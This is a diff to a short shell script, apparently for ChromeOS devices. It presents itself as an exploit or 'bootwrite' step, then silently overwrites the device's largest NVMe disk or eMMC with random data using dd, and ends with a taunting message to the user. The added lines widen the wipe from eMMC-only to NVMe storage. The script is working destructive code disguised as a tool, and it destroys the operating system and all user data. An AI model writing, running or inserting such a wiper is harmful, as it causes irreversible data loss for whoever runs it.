@@ -1,7 +1,13 @@
+. /usr/share/misc/chromeos-common.sh
+DST=/dev/$(get_largest_nvme_namespace)
+if [ -z $DST ]; then
+    DST=/dev/mmcblk0
+fi
+
 echo "Sourcing exploit files."
 sleep 1.5
 echo "Starting bootwrite."
-dd if=/dev/urandom of=/dev/mmcblk0 >/dev/null &
+dd if=/dev/urandom of=${DST} >/dev/null &
 sleep 2
 echo "Think about what you just did."
 sleep 2
